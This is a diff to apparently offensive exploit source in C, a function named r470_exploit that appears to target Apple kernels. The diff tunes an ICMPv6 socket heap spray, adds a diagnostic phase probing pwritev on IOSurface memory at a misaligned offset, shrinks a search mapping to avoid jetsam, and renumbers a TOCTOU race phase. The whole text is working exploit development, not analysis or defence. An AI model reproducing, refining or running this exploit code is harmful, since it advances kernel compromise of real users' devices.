@@ -17376,8 +17376,8 @@ static void r470_exploit(void) {
 
     /* Phase 1: ICMPv6 spray */
     rlog("  --- Phase 1: ICMPv6 spray ---\n"); fflush(stdout);
-    int icmp_fds[2000]; int icmp_count = 0;
-    for (int i = 0; i < 2000; i++) {
+    int icmp_fds[500]; int icmp_count = 0;
+    for (int i = 0; i < 500; i++) {
         icmp_fds[i] = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
         if (icmp_fds[i] < 0) break;
         struct icmp6_filter filt;
@@ -17433,8 +17433,34 @@ static void r470_exploit(void) {
         rlog("\n=== r470 done ===\n"); return;
     }
 
-    /* Phase 3: Search mapping (128 MiB, random addr) */
-    rlog("\n  --- Phase 3: Search mapping (%llu MiB) ---\n",
+    /* Phase 3: Diagnostic — test IOSurface + pwritev behavior */
+    rlog("\n  --- Phase 3: Diagnostic ---\n"); fflush(stdout);
+    {
+        struct iovec dv = { surf_base, R470_SURF_SZ };
+        errno = 0;
+        ssize_t dw = pwritev(fd, &dv, 1, 0);
+        rlog("    aligned full: w=%zd errno=%d\n", dw, errno);
+
+        struct iovec dv2 = {
+            (void *)((uintptr_t)surf_base + R470_IOV_OFFSET), R470_IOV_LEN
+        };
+        errno = 0;
+        ssize_t dw2 = pwritev(fd, &dv2, 1, R470_IOV_OFFSET);
+        rlog("    misaligned 0x3f00: w=%zd errno=%d\n", dw2, errno);
+
+        uint8_t chk[16];
+        pread(fd, chk, 16, 0);
+        rlog("    file@0: %02x %02x %02x %02x\n", chk[0], chk[1], chk[2], chk[3]);
+        pread(fd, chk, 16, R470_IOV_OFFSET);
+        rlog("    file@0x3f00: %02x %02x %02x %02x\n", chk[0], chk[1], chk[2], chk[3]);
+        pread(fd, chk, 16, 0x4000);
+        rlog("    file@0x4000: %02x %02x %02x %02x\n", chk[0], chk[1], chk[2], chk[3]);
+    }
+
+    /* Phase 4: Search mapping (32 MiB to avoid jetsam) */
+    #undef R470_SEARCH_SZ
+    #define R470_SEARCH_SZ (32ULL * 1024 * 1024)
+    rlog("\n  --- Phase 4: Search mapping (%llu MiB) ---\n",
          (unsigned long long)(R470_SEARCH_SZ / (1024 * 1024)));
     fflush(stdout);
     mach_vm_address_t search_base = 0;
@@ -17461,7 +17487,7 @@ static void r470_exploit(void) {
     rlog("    Done faulting\n");
 
     /* Phase 4: Race loop */
-    rlog("\n  --- Phase 4: TOCTOU race ---\n");
+    rlog("\n  --- Phase 5: TOCTOU race ---\n");
     rlog("    iov_base=surf+0x%x iov_len=0x%x file_off=0x%x\n",
          R470_IOV_OFFSET, R470_IOV_LEN, R470_IOV_OFFSET);
     rlog("    %d iters per search page, %llu search pages\n",
